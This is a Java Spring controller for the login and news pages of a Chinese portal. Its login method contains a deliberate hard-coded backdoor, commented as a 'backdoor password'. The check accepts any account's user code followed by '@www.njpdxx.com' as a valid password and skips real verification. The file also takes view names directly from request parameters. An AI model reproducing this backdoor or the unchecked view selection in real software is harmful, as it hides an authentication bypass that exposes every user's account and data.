package com.pinde.sci.ctrl.inx;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

import com.pinde.core.page.PageHelper;
import com.pinde.core.util.SpringUtil;
import com.pinde.core.util.StringUtil;
import com.pinde.sci.biz.edc.IProjUserBiz;
import com.pinde.sci.biz.inx.IinxColumnManageBiz;
import com.pinde.sci.biz.inx.IinxInfoManageBiz;
import com.pinde.sci.biz.inx.IInxInfoBiz;
import com.pinde.sci.biz.security.PasswordHelper;
import com.pinde.sci.biz.sys.IOrgBiz;
import com.pinde.sci.biz.sys.IRoleBiz;
import com.pinde.sci.biz.sys.IUserBiz;
import com.pinde.sci.biz.sys.IUserRoleBiz;
import com.pinde.sci.biz.sys.impl.OrgBizImpl;
import com.pinde.sci.common.GeneralController;
import com.pinde.sci.common.GeneralMethod;
import com.pinde.sci.common.GlobalConstant;
import com.pinde.sci.common.GlobalContext;
import com.pinde.sci.common.InitConfig;
import com.pinde.sci.common.SessionData;
import com.pinde.sci.common.util.LoginUtil;
import com.pinde.sci.dao.base.SysLogMapper;
import com.pinde.sci.enums.pub.UserStatusEnum;
import com.pinde.sci.enums.sys.OperTypeEnum;
import com.pinde.sci.form.inx.InxInfoForm;
import com.pinde.sci.model.mo.InxColumn;
import com.pinde.sci.model.mo.InxInfo;
import com.pinde.sci.model.mo.SysDept;
import com.pinde.sci.model.mo.SysLog;
import com.pinde.sci.model.mo.SysOrg;
import com.pinde.sci.model.mo.SysUser;
/**
 * 
 * @author tiger
 *
 */

@Controller
@RequestMapping("/inx/wxwsj")
public class InxWxwsjController extends GeneralController{
	
	private static Logger logger = LoggerFactory.getLogger(InxWxwsjController.class);
	@Autowired
	private IInxInfoBiz inxInfoBiz;
	@Autowired
	private IinxColumnManageBiz columnBiz;
	@Autowired
	private IinxInfoManageBiz infoManageBiz;
	@Autowired
	private IUserBiz userBiz;
	@Autowired
	private IOrgBiz sysOrgBiz;	
	@Autowired
	private IUserRoleBiz userRoleBiz;
	@Autowired
	private IProjUserBiz projUserBiz;	
	@Autowired
	private IRoleBiz roleBiz;
	@Autowired
	private SysLogMapper logMapper;
	
	@SuppressWarnings("unchecked")
	@RequestMapping(value = { "/login" }, method = RequestMethod.POST)
	public String login(HttpServletRequest request, Model model,String userCode,String orgFlow, String userPasswd, String verifyCode,String successLoginPage,String errorLoginPage) {
		
		//默认登录失败界面
		if(StringUtil.isBlank(errorLoginPage)){
			errorLoginPage = "login";
		}
		//默认登录成功界面
		if(StringUtil.isBlank(successLoginPage)){
			successLoginPage = "redirect:/main?time="+new Date();
		}
		
		String sessionValidateCode = StringUtil.defaultString((String)getSessionAttribute("verifyCode"));
		 //验证码输入不能为空，不区分大小写
		if (StringUtil.isBlank(verifyCode) ||!sessionValidateCode.equalsIgnoreCase(verifyCode)) {
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("validateCode.notEquals"));
			//登录日志
			return errorLoginPage;
		}
		 //登录码不能为空
		if (StringUtil.isBlank(userCode)){
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.isNull"));
			return errorLoginPage;
		}
		//密码不能为空
		if (StringUtil.isBlank(userPasswd)){
			model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userPasswd.isNull"));
			return errorLoginPage;
		}
		//查是否存在此用户
		SysUser user = userBiz.findByUserCodeAndOrgFlow(userCode,orgFlow);
		if(GlobalConstant.ROOT_USER_CODE.equals(userCode)){
			user =  userBiz.findByUserCode(userCode);
		}
		if(user==null){
			user = userBiz.findByUserPhone(userCode);
		}
		if(user==null){
			user = userBiz.findByIdNo(userCode);
		}
		if(user==null){
			if(!GlobalConstant.ROOT_USER_CODE.equals(userCode)){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.notFound"));
				return errorLoginPage;					
			}
		}
		//root用户不判断是否锁定
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			if(UserStatusEnum.Locked.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.locked"));
				return errorLoginPage;
			}
			if(UserStatusEnum.Reged.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unActivated"));
				return errorLoginPage;
			}
			if(UserStatusEnum.Added.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unReged"));
				return errorLoginPage;
			}
			if(!UserStatusEnum.Activated.getId().equals(user.getStatusId())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userCode.unActivated"));
				return errorLoginPage;
			}
		}
		//后门密码
		if(!StringUtil.defaultString(userPasswd).equals(userCode+"@www.njpdxx.com")){
			//判断密码
			String passwd = StringUtil.defaultString(user.getUserPasswd());
			if(!passwd.equalsIgnoreCase(PasswordHelper.encryptPassword(user.getUserFlow(), userPasswd))){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("userPasswd.error"));
				return errorLoginPage;
			}			
		}	
		
		//唯一登录
		if(!GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())&&GlobalConstant.FLAG_Y.equals(InitConfig.getSysCfg("unique_login_flag"))){
			if(SessionData.sessionDataMap.containsKey(user.getUserFlow()) && 
					!SessionData.sessionDataMap.get(user.getUserFlow()).getIp().equals(request.getRemoteAddr())){
				model.addAttribute("loginErrorMessage",SpringUtil.getMessage("user.alreadyLogin"));
				return errorLoginPage;
			}
		}
		
		
		//设置当前用户
		setSessionAttribute(GlobalConstant.CURRENT_USER, user);	
		setSessionAttribute(GlobalConstant.CURRENT_USER_NAME, user.getUserName());	
		setSessionAttribute(GlobalConstant.CURRENT_ORG, sysOrgBiz.readSysOrg(user.getOrgFlow()));	
		//设置当前用户部门列表
		setSessionAttribute(GlobalConstant.CURRENT_DEPT_LIST, userBiz.getUserDept(user));
		
		//加载系统权限
		LoginUtil.loadSysRole(user.getUserFlow(), userRoleBiz, roleBiz);
		
		if(GlobalConstant.ROOT_USER_CODE.equals(user.getUserCode())){
			return successLoginPage;
		}

		List<String> currUserWorkStationIdList = (List<String>) GlobalContext.getSessionAttribute(GlobalConstant.CURRENT_WORKSTATION_ID_LIST);
		if (currUserWorkStationIdList != null && currUserWorkStationIdList.size() > 0) {
			//在线用户功能使用
			SessionData sessionData = new SessionData();
			sessionData.setSysUser(user);
			sessionData.setIp(request.getRemoteAddr());
			long now = System.currentTimeMillis();
			String loginTime = new java.sql.Date(now)+"&nbsp;"+new java.sql.Time(now);
			sessionData.setLoginTime(loginTime);
			setSessionAttribute(SessionData.SESSIONDATAID,sessionData);
			
			//记录日志
			SysLog log = new SysLog();
			//log.setReqTypeId(ReqTypeEnum.GET.getId());
			log.setOperId(OperTypeEnum.LogIn.getId());
			log.setOperName(OperTypeEnum.LogIn.getName());
			log.setLogDesc("登录IP["+request.getRemoteAddr()+"]");
			log.setWsId(GlobalConstant.SYS_WS_ID);
			GeneralMethod.addSysLog(log);
			logMapper.insert(log);
			
			return successLoginPage;
		}else{
			model.addAttribute("loginErrorMessage", SpringUtil.getMessage("permissin.error"));
			return errorLoginPage;			
		}
	}
	/**
	 * 加载首页资讯列表
	 * @param columnId
	 * @param jsp
	 * @param model
	 * @param endIndex
	 * @return
	 */
	@RequestMapping(value="/queryData",method={RequestMethod.GET})
	public String queryData(String columnId,String jsp, Model model,String endIndex,String imgUrl){
		InxInfoForm form = new InxInfoForm();
		form.setColumnId(columnId);
		PageHelper.startPage(1, Integer.parseInt(endIndex));
		List<InxInfo> infoList = inxInfoBiz.getList(form);
		model.addAttribute("infoList", infoList);
		if(GlobalConstant.FLAG_Y.equals(imgUrl)){
			//图片路径
			String imageBaseUrl = this.infoManageBiz.getImageBaseUrl();
			model.addAttribute("imageBaseUrl", imageBaseUrl);
		}
		return jsp;
	}	
	@RequestMapping(value="/selOrg",method={RequestMethod.GET})
	@ResponseBody
	public List<SysOrg> selOrg(String orgAreaId){
		SysOrg sysOrg = new SysOrg();
		sysOrg.setOrgAreaId(orgAreaId);
		List<SysOrg> orgList = sysOrgBiz.searchOrg(sysOrg);
		return orgList;
	}	
	
	/**
	 * 加载新闻图片
	 * @param columnId
	 * @param jsp
	 * @param model
	 * @param endIndex
	 * @return
	 */
	@RequestMapping(value="/queryImgNews",method={RequestMethod.GET})
	public String queryImgNews(String columnId,String jsp,Model model,String endIndex){
		String imageBaseUrl = this.infoManageBiz.getImageBaseUrl();//图片url根路径
		model.addAttribute("imageBaseUrl", imageBaseUrl);
		InxInfoForm form = new InxInfoForm();
		form.setColumnId(columnId);
		form.setHasImage(GlobalConstant.FLAG_Y);
		PageHelper.startPage(1, Integer.parseInt(endIndex));
		List<InxInfo> imgNewsList = inxInfoBiz.getList(form);
		model.addAttribute("imgNewsList", imgNewsList);
		return jsp;
	}	
	
	/**
	 * 首页
	 * @param column
	 * @param model
	 * @return
	 */
	@RequestMapping(value="",method={RequestMethod.GET})
	public String index(InxColumn column, Model model){
		return "inx/wxwsj/index";
	}
	
	/**
	 * 查看一条资讯
	 * @param infoFlow
	 * @param columnId
	 * @param model
	 * @return
	 */
	@RequestMapping(value="/getByInfoFlow",method={RequestMethod.GET})
	public String getByInfoFlow(String infoFlow, String endDate, String columnId, String nextFlag, Model model){
		if(StringUtil.isNotBlank(infoFlow)){
			InxInfo info = inxInfoBiz.getByInfoFlow(infoFlow);
			model.addAttribute("info", info);
			//浏览量
			if(info != null){
				Long viewNum = info.getViewNum();
				if(viewNum == null){
					viewNum = Long.valueOf(0);
				}
				viewNum ++;
				InxInfo update = new InxInfo();
				update.setInfoFlow(infoFlow);
				update.setViewNum(viewNum);
				inxInfoBiz.modifyInxInfo(update);
			}
			//下一篇
			if((!GlobalConstant.FLAG_N.equals(nextFlag)) && StringUtil.isNotBlank(columnId)){
				InxInfoForm form = new InxInfoForm();
				form.setColumnId(columnId);
				form.setEndDate(endDate);
				PageHelper.startPage(1, 10);
				List<InxInfo> infoList = inxInfoBiz.getList(form);
				if(infoList != null && !infoList.isEmpty()){
					InxInfo nextInfo = null;
					for(int i = 0; i < infoList.size(); i++){
						if(infoList.get(i).getInfoFlow().equals(infoFlow) && (i+1)<infoList.size()){
							nextInfo = infoList.get(i+1);
							model.addAttribute("nextInfo", nextInfo);
							break;
						}
					}
				}
			}
		}
		return "inx/wxwsj/news_children";
	}
	
	/**
	 * 加载分类
	 * @param columnId
	 * @param model
	 * @return
	 */
	@RequestMapping(value="/queryByColumnId",method={RequestMethod.GET})
	public ModelAndView queryByColumnId(String columnId, Model model){
		ModelAndView mav = new ModelAndView();
		if(StringUtil.isNotBlank(columnId)){
			//分类
			Map<String, Object> paramMap = new HashMap<String, Object>();
			paramMap.put("columnId", columnId);
			List<InxColumn> classifyList = columnBiz.searchInxColumnList(paramMap);
			mav.addObject("classifyList", classifyList);
		}
		mav.setViewName("inx/wxwsj/news");
		return mav;
	}
	
	
	/**
	 * 加载资讯列表
	 * @param columnId
	 * @param currentPage
	 * @param request
	 * @param model
	 * @return
	 */
	@RequestMapping(value="loadInfoList",method={RequestMethod.GET})
	public ModelAndView loadInfoList(String columnId, Integer currentPage, HttpServletRequest request, String isWithBlobs, Model model){
		ModelAndView mav = new ModelAndView();
		InxInfoForm form = new InxInfoForm();
		form.setColumnId(columnId);
		if(GlobalConstant.FLAG_Y.equals(isWithBlobs)){//名医
			form.setIsWithBlobs(GlobalConstant.FLAG_Y);
		}
		List<InxInfo> infoList2 = new ArrayList<InxInfo>();
		PageHelper.startPage(currentPage, getPageSize(request));
		if(columnId.length() > 4){//分类
			infoList2 = this.inxInfoBiz.queryClassifyList(form);
		}else{
			infoList2 = this.inxInfoBiz.getList(form);
		}
		mav.addObject("infoList2", infoList2);
		//首条资讯内容
		/*if(infoList2 != null &&  !infoList2.isEmpty()){
			InxInfo firstInfo = inxInfoBiz.getByInfoFlow(infoList2.get(0).getInfoFlow());
			mav.addObject("firstInfo", firstInfo);
		}*/
		//图片路径
		String imageBaseUrl = this.infoManageBiz.getImageBaseUrl();
		mav.addObject("imageBaseUrl", imageBaseUrl);
		if(GlobalConstant.FLAG_Y.equals(isWithBlobs)){//名医
			mav.setViewName("inx/wxwsj/expert");
		}else{
			mav.setViewName("inx/wxwsj/infoList");
		}
		return mav;
	}
		
}
